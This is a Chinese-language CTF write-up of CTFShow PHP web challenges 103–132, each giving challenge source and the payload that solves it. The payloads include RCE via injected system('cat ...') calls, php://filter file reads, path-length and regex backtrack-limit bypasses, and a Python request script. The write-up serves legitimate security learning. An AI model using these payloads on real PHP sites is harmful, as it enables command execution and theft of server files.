> 具体来说，`$str = call_user_func($v1, $s);` 这行代码的含义如下：
>
> - `$v1` 是一个回调函数，可以是函数名的字符串，也可以是包含对象和方法的数组，或者是可调用的变量（比如闭包）。
> - `$s` 是传递给回调函数 `$v1` 的参数。
> - `call_user_func($v1, $s)` 调用 `$v1` 指定的回调函数，并将 `$s` 作为参数传递给这个函数。
> - 调用的结果被赋值给变量 `$str`。
>
> ### 示例 1：使用函数名作为回调
>
> php
>
> ```php
> $str = call_user_func('strlen', "Hello World");
> echo $str; // 输出：11
> ```
>
> 这里，`strlen` 是一个内置的 PHP 函数，用于计算字符串的长度，`"Hello World"` 是传递给 `strlen` 函数的参数。
>
> ### 示例 2：使用对象和方法作为回调
>
> php
>
> ```php
> class Example {
>     public function sayHello($name) {
>         return "Hello, " . $name;
>     }
> }
> 
> $obj = new Example();
> $str = call_user_func(array($obj, 'sayHello'), "Kimi");
> echo $str; // 输出：Hello, Kimi
> ```
>
> 这里，`array($obj, 'sayHello')` 表示一个包含对象和方法名的数组，`"Kimi"` 是传递给 `sayHello` 方法的参数。
>
> ### 示例 3：使用闭包作为回调
>
> php
>
> ```php
> $greet = function($name) {
>     return "Greetings, " . $name;
> };
> 
> $str = call_user_func($greet, "Kimi");
> echo $str; // 输出：Greetings, Kimi
> ```

## Web103：hex2bin+伪协议构造webshell

![web103](.\image_php\web103.png)



## Web104

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:27:20

*/


highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}



?>
```

传入两个相同参数就行

## Web105

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:34:07

*/

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
your are good ctfshow{c7a1f2bc-f195-45a0-9a30-44b41534eb95}
```

payload：

```
?suces=flag&flag=
?suces=flag POST error=suces
?suces=flag&你还想要flag嘛？=error POST flag=你还想要flag嘛？
```

## Web106

```
弱比较
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
数组绕过
post v1[]=1 ?v2[]=2
```

## Web107

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:24:14

*/


highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }

}



?>
```

payload

```
md5构造
?v3=666 POST v1=flag%3Dfae0b27c451c728867a567e8c1bb4e53
数组绕过
?v3[]=666  POST v1=a%3D6 或v1=
弱比较绕过
?v3=QNKCDZO MD5：0e830400451993494058024219903391 POST v1=flag=0
```

## Web108：ereg函数%00截断绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:53:55

*/


highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
```

strrev是字符反转

intval将字符转换成int数字

ereg是废弃的正则匹配函数，可以通过%00截断绕过

payload

```
?c=c%00778
```

## Web109：反射构造rce

题目

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:02:34

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}

?>
```

这里看到new想到创建对象，使用ReflectionClass构造system类

反射构造命令执行的方法

1. ReflectionFunction
```php
<?php
// 创建一个 ReflectionFunction 对象，用于反射 system 函数
$function = new ReflectionFunction('system');

// 获取函数的名称
echo "函数名称: " . $function->getName() . "<br>";

// 获取函数的文档注释
echo "文档注释: " . $function->getDocComment() . "<br>";

// 获取函数的参数
$params = $function->getParameters();
echo "参数列表:<br>";
foreach ($params as $param) {
    echo "参数名称: " . $param->getName() . "<br>";
}

// 获取函数是否返回值
if ($function->hasReturnType()) {
    echo "返回类型: " . $function->getReturnType()->getName() . "<br>";
}

// $return_value = 0;
// invoke函数触发function函数
$output = $function->invoke('dir');
echo $output.'<br>';
?>
```

### eval("echo new $v1($v2());");绕过

1. 匿名函数

   ```php
   ?v1=class{ public function __construct(){ system('ls'); } };&v2=a
   ```

2. RelfectionClass和ReflectionFunction

   ```php
   ?v1=ReflectionClass&v2=system('cat fl36dg.txt')
   ?v1=ReflectionFunction&v2=system('cat fl36dg.txt')
   ```

3. Exception

   ```php
   ?v1=Exception&v2=system('cat fl36dg.txt')
   ```

4. 内置类

   ?v1=内置类&v2=system('cat fl36dg.txt')

   > PHP 提供了许多内置类，这些类覆盖了从基本的数据结构到网络编程的各个方面。以下是一些常见的 PHP 内置类：
   >
   > 1. **基本数据类型类**:
   >    - `stdClass`：一个简单的标准类，没有预定义的属性或方法。
   >
   > 2. **资源处理类**:
   >    - `Closure`：表示一个闭包（匿名函数）。
   >    - `Generator`：表示一个生成器，用于创建生成器函数。
   >
   > 3. **异常处理类**:
   >    - `Exception`：所有异常类的基类。
   >    - `ErrorException`：表示一个错误信息。
   >
   > 4. **集合与数组处理类**:
   >    - `ArrayObject`：允许数组或对象像对象一样被操作。
   >    - `SplObjectStorage`：存储对象的集合。
   >    - `ArrayIterator`：允许数组通过迭代器接口进行迭代。
   >    - `RecursiveArrayIterator`：支持递归遍历数组。
   >    - `IteratorIterator`：装饰一个迭代器。
   >
   > 5. **文件系统和目录类**:
   >    - `DirectoryIterator`：用于遍历文件系统的目录。
   >    - `FilesystemIterator`：提供文件系统目录的过滤器。
   >    - `GlobIterator`：用于遍历匹配特定模式的文件路径。
   >
   > 6. **多字节字符串和正则表达式类**:
   >    - `MBString`：多字节字符串函数。
   >    - `RegexIterator`：使用正则表达式过滤迭代器。
   >
   > 7. **日期和时间类**:
   >    - `DateTime`：表示日期和时间。
   >    - `DateInterval`：表示时间间隔。
   >    - `DateTimeZone`：表示时区。
   >
   > 8. **JSON 处理类**:
   >    - `JsonSerializable`：允许对象被序列化为 JSON。
   >    - `stdClass`：用于解析 JSON 对象。
   >
   > 9. **XML 处理类**:
   >    - `DOMDocument`：表示一个 XML 文档。
   >    - `SimpleXMLElement`：表示一个简单的 XML 元素。
   >    - `XMLReader`：提供一种方式来读取 XML 文档。
   >
   > 10. **网络编程类**:
   >     - `cURL`：用于发起 HTTP 请求。
   >     - `FTP`：用于 FTP 连接和操作。
   >
   > 11. **数据库和数据存储类**:
   >     - `PDO`：提供了一个数据访问抽象层，用于连接和操作多种数据库。
   >     - `PDOStatement`：表示一个 PDO 语句。
   >     - `mysqli`：用于连接和操作 MySQL 数据库。
   >
   > 12. **图像处理类**:
   >     - `GD`：用于图像处理。
   >     - `Image`：用于处理图像。
   >
   > 13. **其他实用类**:
   >     - `Reflection`：用于反射。
   >     - `SessionHandlerInterface`：用于会话处理。
   >     - `SplFileObject`：用于文件操作。
   >
   > 这些只是 PHP 内置类的一部分。PHP 还提供了许多其他类，用于不同的功能和操作。你可以通过 PHP 的官方文档来获取更全面的内置类列表和它们的详细用法。

## Web110

   题目

   ```php
   <?php
   
   /*
   # -*- coding: utf-8 -*-
   # @Author: h1xa
   # @Date:   2020-09-16 11:25:09
   # @Last Modified by:   h1xa
   # @Last Modified time: 2020-09-29 22:49:10
   
   */
   
   
   highlight_file(__FILE__);
   error_reporting(0);
   if(isset($_GET['v1']) && isset($_GET['v2'])){
       $v1 = $_GET['v1'];
       $v2 = $_GET['v2'];
   
       if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
               die("error v1");
       }
       if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
               die("error v2");
       }
   
       eval("echo new $v1($v2());");
   
   }
   
   ?>
   ```

思路：

与web109都是到最后执行echo new $v1($v2());

所以想到用内置函数构造，这题有过滤所以不尝试命令执行，因为即使构造出命令执行函数system也不能传递命令进去，所以尝试文件读取或者文件遍历，参考上面内置类中不能与文件有关的就只有：

- `DirectoryIterator`：用于遍历文件系统的目录。
- `FilesystemIterator`：提供文件系统目录的过滤器。
- `GlobIterator`：用于遍历匹配特定模式的文件路径。

三者的使用如下

- DirectoryIterator

  > 实例：
  > ```php
  > <?php
  > $a = new DirectoryIterator(getcwd());
  > foreach($a as $file){
  > 	echo $file->getFilename().'<br>';
  > }
  > ?>
  > ```
  >
  > 输出：
  >
  > ```txt
  > .
  > ..
  > .htaccess
  > ctfshow_web41.php
  > DVWA
  > DVWA.zip
  > error
  > ```
  
- FilesystemIterator

  > 实例：
  >
  > ```php
  > <?php
  > $a = new FilesystemIterator(getcwd());
  > foreach($a as $file){
  > 	echo $file->getFilename().'<br>';
  > }
  > ?>
  > ```
  >
  > 输出：
  >
  > ```txt
  > .htaccess
  > ctfshow_web41.php
  > DVWA
  > DVWA.zip
  > error
  > ```
  >
  > FilesystemIterator与DirectoryIterator的区别在于FilesystemIterator不包含`.`和`..`

- GlobIterator

  > GlobIterator用于模式匹配比如：*.php
  >
  > 实例：
  >
  > ```php
  > <?php
  > $a = new GlobIterator("*.php",FilesystemIterator::KEY_AS_FILENAME);
  > foreach($a as $file){
  > 	echo $file->getFilename().'<br>';
  > }
  > ?>
  > ```
  >
  > 输出：
  >
  > ```txt
  > Gazilla.php
  > ctfshow_web41.php
  > hex2bin.php
  > info.php
  > lovemath.php
  > pcb_fileread.php
  > pcb_fileread_test.php
  > pop.php
  > serialize.php
  > test.php
  > test1.php
  > test2.php
  > unserialize.php
  > web55.php
  > web55_p.php
  > web59.php
  > ```

三者都可以用于文件遍历但是由于GlobIterator用于模式匹配由于过滤不适用于当前题目，另外三者都是迭代器echo Iterator只会输出第一个迭代的文件名，而DiractoryIterator中包含了`.`和`..`所以在不迭代的情况下echo只会输出`..`

payload

   ```php
   /?v1=FilesystemIterator&v2=getcwd
   输出fl36dga.txt
   ```

直接访问即可得到flag

![web110_flag](.\image_php\web110_flag.png)

## Web111：php引用和$GLOBALS变量

题目

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 02:41:40

*/

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }

}
```

php中的$GLOBALS变量会记录php中声明的所有变量，包括一些http请求头中的变量

```php
<?php
    $a = 'A';
    var_dump($GLOBALS);
?>
```

输出：

```
array(6) { ["_GET"]=> array(0) { } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(2) { ["_ga"]=> string(26) "GA1.1.742250855.1729494993" ["_ga_R1FN4KJKJH"]=> string(37) "GS1.1.1729494993.1.1.1729495564.0.0.0" } ["_FILES"]=> array(0) { } ["GLOBALS"]=> array(6) { ["_GET"]=> array(0) { } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(2) { ["_ga"]=> string(26) "GA1.1.742250855.1729494993" ["_ga_R1FN4KJKJH"]=> string(37) "GS1.1.1729494993.1.1.1729495564.0.0.0" } ["_FILES"]=> array(0) { } ["GLOBALS"]=> *RECURSION* ["a"]=> string(1) "A" } ["a"]=> string(1) "A" }
```

思路就是构造$GLOBALS，使最后的`var_dump($$v1);`等于`var_dump($GLOBALS);`，由于上一句`eval("$$v1=&$$v2;");`所以要构造`&$$v2=$GLOBAL`所以`$v2=GLOBAL`

所以payload为

`?v1=ctfshow&v2=GLOBALS`

另外题目中的&其实对对题目影响不大

### php引用&

`&`：在 PHP 中，`&` 用于创建变量的引用。当你想要两个变量指向同一数据时，你可以使用 `&` 来创建一个引用。

- **按引用传递参数**：在函数中，如果你想要在函数内部修改参数的值，并让这种修改影响到外部变量，你可以使用 `&` 来按引用传递参数。

  ```php
  function increment(&$number) {
      $number++;
  }
  
  $num = 5;
  increment($num);
  echo $num; // 输出: 6
  ```

- **创建变量的引用**：你可以使用 `&` 来创建一个变量的引用，这样两个变量名就指向了同一个值。

  ```php
  $a = "original";
  $b = &$a;
  $b = "changed";
  echo $a; // 输出: changed
  ```

  在这个例子中，`$b` 是 `$a` 的引用，所以对 `$b` 的修改也会影响到 `$a`。

- **解引用**：在变量名前面使用 `$` 和 `{}` 可以解引用一个变量，即获取变量的值而不是变量本身。

  ```php
  $a = "value";
  $b = &$a;
  $c = $$b; // $c 现在是 "value"
  ```

  在这个例子中，`$$b` 解引用了 `$b`，获取了 `$b` 引用的值，即 `$a` 的值。

所以不管是引用还是不加引用其实都不影响这里题目获取$GLOBALS，不加引用相当于$ctfshow复制了$GOBLE的值而不是获取$GLOBALS本身

## Web112：php://filter

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:49

*/

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

if(! is_file($file))决定file不能是文件，所以只能使用伪协议读文件，过滤了一些常用编码和伪协议，换其他伪协议或者编码读取

### 伪协议读取文件绕过is_file()

```php
php://filter/resource=flag.php
php://filter/read=convert.base64-encoder/resource=flag.php
php://filter/convert.base64-encode/resource=flag.php
php://filter/convert.quoted-printable-encode/resource=flag.php
php://filter/read=string.rot13/resource=flag.php
php://filter/convert.string.strip_tags/resource=flag.php
// 多个过滤器可以使用管道符连接
php://filter/read=string.rot13|convert.base64-encode/resource=flag.php
// 使用convert.iconv.*编码转换绕过
php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
// zlib://伪协议读取文件
compress.zlib://flag.php
// 但是其他两个压缩伪协议读取不了
```

convert.iconv.\*.\*不同编码使用

```php
convert.iconv.UTF-8.UTF-16BE：将 UTF-8 编码转换为 UTF-16BE。
convert.iconv.UTF-8.UTF-16LE：将 UTF-8 编码转换为 UTF-16LE。
convert.iconv.UTF-8.UTF-32BE：将 UTF-8 编码转换为 UTF-32BE。
convert.iconv.UTF-8.UTF-32LE：将 UTF-8 编码转换为 UTF-32LE。
convert.iconv.UTF-16BE.UTF-8：将 UTF-16BE 编码转换为 UTF-8。
convert.iconv.UTF-16LE.UTF-8：将 UTF-16LE 编码转换为 UTF-8。
convert.iconv.UTF-32BE.UTF-8：将 UTF-32BE 编码转换为 UTF-8。
convert.iconv.UTF-32LE.UTF-8：将 UTF-32LE 编码转换为 UTF-8。
convert.iconv.ISO-8859-1.UTF-8：将 ISO-8859-1 编码转换为 UTF-8。
convert.iconv.ISO-8859-15.UTF-8：将 ISO-8859-15 编码转换为 UTF-8。
convert.iconv.WINDOWS-1252.UTF-8：将 WINDOWS-1252 编码转换为 UTF-8。
convert.iconv.GBK.UTF-8：将 GBK 编码转换为 UTF-8。
convert.iconv.GB18030.UTF-8：将 GB18030 编码转换为 UTF-8。
convert.iconv.BIG5.UTF-8：将 BIG5 编码转换为 UTF-8。
convert.iconv.SHIFT_JIS.UTF-8：将 SHIFT_JIS 编码转换为 UTF-8。
convert.iconv.EUC-JP.UTF-8：将 EUC-JP 编码转换为 UTF-8。
```

### is_file()长度限制绕过：

原理：/proc/self/root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了。

payload：

```
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php
```

## Web113

过滤了filter，使用上述目录溢出构造超长突破限制的方法

payload

```
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php
```

## Web114

未过滤filter

php://filter/resource=flag.php

## Web115：\x036数字检测绕过

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:08:19

*/

include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} 
```

在php中"36"是等于"\x0c36"的，同时trim也不会过滤掉\x0c也就是%0c，提交payload: /?num=%0c36
此时$num不等于36，且为数字，trim以后也不等于36，且'\x0c36'=='36'

payload=?num=%0c36

## Web123：特殊POST变量名构造

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

思路很简单但是出现了如下问题：`.`会被转换成`_`

![web123](.\image_php\web123.png)

查看师傅们给的wp得出如下：

**关键：**由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为`_`，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换

payload：

```php
CTF_SHOW=&CTF[SHOW.COM=1&fun=echo $flag
```

## Web125：$_SERVER['argv']变量

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
#
#
*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```



> 1、cli模式（命令行）下
>
> ```
> 第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数
> ```
>
> 2、web网页模式下 在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，`$_SERVER[‘argv’]`才会有效 这时候的`$_SERVER[‘argv’]=$_SERVER['QUERY_STRING']`

测试脚本：

```php
<?php
    // 用var_dump和phpinfo()都可以查看
    var_dump($_SERVER);
    phpinfo();
?>
```

![web125_SERVER_1](.\image_php\web125_SERVER_1.png)

![web125_SERVER_2](.\image_php\web125_SERVER_2.png)

所以可得payload为：

```php
POST:fun=eval($a[0])&CTF_SHOW=1&CTF[SHOW.COM=1
GET:?$fl0g=flag_give_me;
// 应该是题目限制了函数执行,本地测试是可以的
GET:?var_dump($GLOBALS);
```

## Web127：extract()函数

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-10 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-10 21:52:49

*/


error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```

### extract()函数特性：

`extract($_GET);` 这行代码的作用是：

1. 将 `$_GET` 数组中的每个键（参数名）和值（参数值）提取出来。
2. 在当前作用域中创建新的变量，变量名与 `$_GET` 数组中的键相同。
3. 这些新变量的值与 `$_GET` 数组中对应的值相同。

例如，如果有一个 URL 如下：

```text
http://example.com/page.php?name=John&age=30
```

在 `page.php` 文件中使用 `extract($_GET);` 后，`name` 和 `age` 就会成为局部变量，分别拥有值 `John` 和 `30`。

需要注意的是，使用 `extract` 函数时应该小心，因为它可能会覆盖同名的现有变量。

### 思路：

在get中给`ctf_show=ilove36d`即可，但是这里过滤了`_`前面，web123提到`空格、+、_、.、[`都会变成`_`

题目waf中没过滤`空格`payload:

```
/?ctf%20show=ilove36d
```

## Web128：gettext()和_()

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-10 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-12 19:49:05

*/


error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

关键是`var_dump(call_user_func(call_user_func($f1,$f2)));` 最外是var_dump尝试构造`call_user_func(call_user_func($f1,$f2))`能获取变量flag,而且需要使用一个不要参数的回调函数因为前一个`call_user_func(最里面回调函数的结果为一个函数名,无参数)`自然想到`get_definded_var()`这个函数，但是要使里面的`call_user_func($f1,$f2)`得到`get_defined_vars`在没有过滤的情况下思路是使用strvar这样的函数构造get_definded_var，或者hex2bin构造出get_definded_var，但是这里进行了过滤字符和数字。看wp是这样说的，使用_()函数，该函数等于gettext()。可以将参数翻译成指定语言，一般就是原封不动的输出参数，get_defined_vars 函数可以输出所有变量的信息，两者结合拿到 flag。

payload：`f1=_&f2=get_defined_vars`

不过在删掉过滤的时候本地测试时发现var_dump(call_user_func(call_user_func("strvar","get_definded_var")));是不行的，后面尝试了`$a="get_defined_vars";var_dump(call_user_func($a));`的方式都不能调用`get_defined_vars`，查了下资料说是call_user_func()函数不支持引用传递。按道理来说`call_user_func("_","get_definded_var")`回调结果也是一个变量应该也不行。不知道是不是版本问题，或者拓展问题毕竟`_()和gettext()`都是要安装拓展的。

## Web129

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 03:18:40

*/


error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

paylaod：

```
f=/ctfshow/../var/www/html/flag.php
// php对无法识别的过滤器只会warning不会报错
f=php://filter/ctfshow/resource=flag.php
f=php://filter/ctfshow|convert.base64-encode/resource=flag.php
```

## Web130：preg_match数组绕过

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 05:19:40

*/


error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

`if(preg_match('/.+?ctfshow/is', $f))`意思是如果匹配到ctfshow前面有任何字符都返回die

> `/.+?ctfshow/is` 的含义如下：
>
> - `.` 表示匹配任意单个字符（除了换行符，除非使用了 `s` 修饰符）。
> - `+` 表示匹配前面的元素一次或多次。
> - `?` 使得 `+` 变为非贪婪模式，即尽可能少地匹配字符。
> - `ctfshow` 是要匹配的确切字符串。
> - i匹配大小写
> - s单行匹配

if(stripos($f, 'ctfshow') === FALSE)则表示$f中必须有`ctfshow`否则die

所以直接给payload：`f=ctfshow`即可

另外也可以使用数组绕过，由于stripos和preg_match都不支持数组所以传入数组都会返回false，payload:`f[]=ctfshow`

## Web131：preg_match最大回溯法绕过

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 05:19:40

*/


error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

不同于前一题使用数组绕过，这里加了强制类型转换(String)绕过传入数组$f会直接变成Array，这里使用最大回溯法绕过，preg_match在处理字符超过一定长度时会返回false这是php的一个安全特性以防止正则表达式的拒绝服务攻击（reDOS）;默认是1000000可以通过`var_dump(ini_get('pcre.backtrack_limit'));`查看回溯次数的最大限制。只要字符数超过最大回溯限制就会返回false

payload：

```python
import requests

buffer = "very"*(1000000//len("very"))+"36Dctfshow"
data = {
    "f":buffer
}

resp = requests.post("http://28ccf4b7-d103-4956-8cc9-b476ad42c263.challenge.ctf.show/",data=data,verify=False)
print(resp.text)
```

> PHP回溯上限利用
>
> 常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。
>
> - DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。
> - NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态。
>
> 大多数程序语言都使用NFA作为正则引擎，其中也包括PHP使用的PCRE库
>
> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。

## Web132

题目：

静态网站，浏览了下基本都是静态网页

![web132_web](.\image_php\web132_web.png)

dirsearch扫描

![web132_dirsearch](F:\桌面\CTFShow\image_php\web132_dirsearch.png)

访问/admin/index.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 06:22:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 20:05:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

#error_reporting(0);
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```

